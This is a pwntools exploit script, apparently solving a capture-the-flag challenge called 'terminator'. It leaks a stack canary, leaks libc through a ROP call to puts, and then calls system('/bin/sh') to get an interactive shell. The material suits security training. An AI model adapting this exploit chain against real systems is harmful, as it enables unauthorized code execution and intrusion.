#!/usr/bin/env python3
from pwn import ELF, remote, gdb, p64, unpack, args, u64

e = ELF('./terminator', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

if args.REMOTE:
    p = remote('terminator.challs.olicyber.it', 10307)
else:
    p = gdb.debug('./terminator', '''
b *welcome+157
continue''')
p.recvuntil(b'> ')
p.sendline(b'a'*55) # overwirte null byte of the canary
p.recvuntil(b'\n\n')
t = p.recvuntil(b'Nice')
canary = b'\x00' + t[0:7] # read the canary
rbp = unpack(t[7:13], len(t[7:13])*8) - 0x8 * 10
p.recvuntil(b'> ')

puts_got = p64(e.got['puts'])
puts_plt = p64(e.plt['puts'])
pop_rdi = p64(0x4012fb)


PAYLOAD = b'a'*16 + p64(rbp) + pop_rdi + puts_got + puts_plt + p64(e.symbols['main']) + canary + p64(rbp) # idk
p.send(PAYLOAD)
p.recvuntil(b'bye!\n')
print(hex(libc.sym['puts'])) # sembra che quello giusto sia 0x80ed0
puts = p.recvline().replace(b'\n',b'').ljust(8, b'\x00')
libc.address = u64(puts) - libc.sym['puts']
print(hex(libc.address))
bin_sh = p64(next(libc.search(b'/bin/sh\x00')))
system = p64(libc.symbols['system'])

print(bin_sh, system)

p.recvuntil(b'> ')
p.sendline(b'a'*55) # overwirte null byte of the canary
p.recvuntil(b'\n\n')
t = p.recvuntil(b'Nice')
canary = b'\x00' + t[0:7] # read the canary
rbp = unpack(t[7:13], len(t[7:13])*8) - 0x8 * 9
p.recvuntil(b'> ')

PAYLOAD = b'a'*24 + p64(rbp) + pop_rdi + bin_sh + system + canary + p64(rbp) # idk
p.send(PAYLOAD)
p.interactive()